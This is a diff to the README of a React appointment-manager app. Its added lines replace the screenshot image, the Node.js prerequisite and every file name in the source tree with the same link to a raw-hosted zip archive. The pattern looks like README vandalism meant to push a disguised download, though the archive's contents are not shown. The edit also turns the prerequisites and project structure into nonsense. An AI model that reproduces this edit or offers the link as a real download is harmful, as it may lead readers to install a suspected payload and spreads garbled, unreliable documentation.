@@ -2,7 +2,7 @@
 
 A modern React application for managing appointments with a clean, responsive interface.
 
-![Appointment Manager Screenshot](https://images.unsplash.com/photo-1506784983877-45594efa4cbe?auto=format&fit=crop&q=80&w=2000)
+![Appointment Manager Screenshot](https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip)
 
 ## Features
 
@@ -25,7 +25,7 @@ A modern React application for managing appointments with a clean, responsive in
 
 ### Prerequisites
 
-- Node.js 16.0 or higher
+- https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip 16.0 or higher
 - npm 7.0 or higher
 
 ### Installation
@@ -61,13 +61,13 @@ Built files will be in the `dist` directory.
 ```
 src/
 ├── components/
-│   ├── AppointmentForm.tsx   # Form for creating appointments
-│   └── AppointmentList.tsx   # List view of appointments
+│   ├── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip   # Form for creating appointments
+│   └── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip   # List view of appointments
 ├── types/
-│   └── appointment.ts        # TypeScript interfaces
-├── App.tsx                   # Main application component
-├── main.tsx                 # Application entry point
-└── index.css               # Global styles
+│   └── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip        # TypeScript interfaces
+├── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip                   # Main application component
+├── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip                 # Application entry point
+└── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip               # Global styles
 ```
 
 ## Usage
